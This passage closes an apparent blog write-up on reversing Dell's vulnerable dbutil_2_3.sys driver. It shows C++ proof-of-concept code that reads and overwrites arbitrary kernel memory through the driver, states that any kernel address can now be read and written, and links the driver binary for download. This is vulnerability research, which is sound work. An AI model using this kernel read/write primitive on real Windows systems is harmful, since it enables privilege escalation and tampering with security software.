            <button class="copy-button" state="copy" data="#include%20%3cstdio.h%3e%0d%0a#include%20%22exploit_dbutil_2_3.h%22%0d%0a%0d%0a%0d%0avoid%20print_bytes%28void*%20bytes,%20unsigned%20int%20size%29%0d%0a%7b%0d%0a%09for%20%28size_t%20i%20=%200;%20i%20%3c%20size;%20i&#43;&#43;%29%0d%0a%09%7b%0d%0a%09%09printf%28%220x%02X%20%22,%20reinterpret_cast%3cunsigned%20char*%3e%28bytes%29[i]%29;%0d%0a%09%7d%0d%0a%7d%0d%0a%0d%0aint%20main%28int%20argc,%20char*%20argv[]%29%0d%0a%7b%0d%0a%09printf%28%22Creating%20handle%20to%20the%20device%20driver%20dbutil_2_3.sys%5cn%22%29;%0d%0a%09DBUtilInterface%20dbutil_interface;%0d%0a%09%0d%0a%09printf%28%22handle%20%25x%5cn%22,%20dbutil_interface.device_handle%29;%0d%0a%09%0d%0a%09void*%20src;%0d%0a%09scanf_s%28%22%25llx%5cn%22,%20&amp;src%29;%0d%0a%0d%0a%09printf%28%22%25llx%5cn%22,%20src%29;%0d%0a%0d%0a%09unsigned%20char%20dst[8];%0d%0a%0d%0a%09dbutil_interface.read_kernel_memory%28dst,%20src,%208%29;%0d%0a%09print_bytes%28dst,%208%29;%0d%0a%0d%0a%09dbutil_interface.write_kernel_memory%28src,%20%28void*%29%22hello%5cx00%5cx00%5cx00%22,%208%29;%0d%0a%0d%0a%09dbutil_interface.read_kernel_memory%28dst,%20src,%208%29;%0d%0a%09print_bytes%28dst,%208%29;%0d%0a%7d">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;exploit_dbutil_2_3.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_bytes</span>(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> bytes, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (size_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> size; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;0x%02X &#34;</span>, <span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*&gt;</span>(bytes)[i]);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;Creating handle to the device driver dbutil_2_3.sys</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>	DBUtilInterface dbutil_interface;
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;handle %x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dbutil_interface.device_handle);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> src;
</span></span><span style="display:flex;"><span>	scanf_s(<span style="color:#e6db74">&#34;%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>src);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, src);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> dst[<span style="color:#ae81ff">8</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	dbutil_interface.read_kernel_memory(dst, src, <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>	print_bytes(dst, <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	dbutil_interface.write_kernel_memory(src, (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#e6db74">&#34;hello</span><span style="color:#ae81ff">\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	dbutil_interface.read_kernel_memory(dst, src, <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>	print_bytes(dst, <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
    
</div>
<p>Now we can use this driver to write memory and read memory from any address in the kernel, just note for yourself that using them on and undefined memory or a memory with invalid protection will result in BSOD&hellip;</p>
<p><a href="/windows/kernel/reverse_dbutil_2_3/files/dbutil_2_3.sys">dbutil_2_3.sys</a></p>

            
        </div>
    </article>

        </main>

        <footer class="footer">
    <div class="footer-left">
        <ul class="social">
            
                <li>All Rights Reserved ®.</li>
            

            
                <li>yoavshah</li>
            

            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
        </ul>
    </div>

    <div class="footer-right">
        <ul class="control status clearfix">
            
                <li>
                    
                        Word Count:
                        541
                    
                </li>
            

            
            

            
                <li>en</li>
            

            
                <li>
                    <a href="https://gohugo.io" class="btn" target="_blank"
                        >Hugo: 0.125.3</a
                    >
                </li>
            

            
                <li>
                    <a
                        href="https://github.com/JingWangTW/dark-theme-editor"
                        class="btn"
                        target="_blank"
                        >Theme: dark-theme-editor</a
                    >
                </li>
            

            
                <li>
                    
                        Last modified: &nbsp;
                        <time>
                            Aug 07 2024 00:00:00
                        </time>
                    
                </li>
            

            
                <li title="">
                    
                </li>
            
        </ul>
    </div>
</footer>

    </body>

    























    
    


    
    


    <script
        type="text/javascript"
        src="/js/index_d751713.min.5eeb120f16ea146352725c420364f87befead45f678142b8f0ffbef024646931fbc06bff07a7bd6cb57fa2f8cd8a21ba6a4ee5a278ec32303a378bc1cd17f246.js"
        integrity="sha512-XusSDxbqFGNSclxCA2T4e&#43;/q1F9ngUK48P&#43;&#43;8CRkaTH7wGv/B6e9bLV/ovjNiiG6ak7lonjsMjA6N4vBzRfyRg=="></script>














<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />




</html>
